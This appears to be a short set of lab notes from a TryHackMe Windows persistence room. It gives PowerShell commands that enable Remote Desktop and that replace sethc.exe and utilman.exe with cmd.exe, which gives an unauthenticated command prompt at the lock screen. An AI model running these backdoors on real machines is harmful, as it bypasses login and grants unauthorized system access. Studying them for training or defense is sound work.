# Windows Persistence - RDP

With physcial access you can backdoor the login screen to access a terminal without having vlid credentials for a machine. THM Room: *"The login screen is merely a suggestion."*

## Enabling Remote Desktop
Require administrative privileges
```powershell
set-itemproperty -path 'HKLM:\System\CurrentControlSet\Control\Terminal\Server' -name "fDenyTSConnections" -Value 0
enable-netfirewallrule -displaygroup "Remote Desktop"
```

## Sticky Keys

Sticky Keys allow for pressing and releasing of sequential combination instead of holding combinations down simultaneously. To backdoor Sticky Keys will leverage the shortcut enabled by default on any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` five times. 
1. Replace `C:\Windows\System32\sethc.exe` ```

```powershell
takeown /f c:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe 
# Requires answer to Overwrite (Yes/No/All) prompt! Use:
# /Y
```

At the lock screen press `SHIFT` five times and you have cmd.exe without credentials.

## Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. Similarly to Sticky Keys Backdoor we just take ownship, full permissions of the binary and  replace it with a cmd.exe or any other backdooring method.

```powershell
takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Requires answer to Overwrite (Yes/No/All) prompt! Use:
# /Y
```

Then press the ease of access button on the lock screen.



## References

[THM Windows Persistence Room](https://tryhackme.com/room/windowslocalpersistence)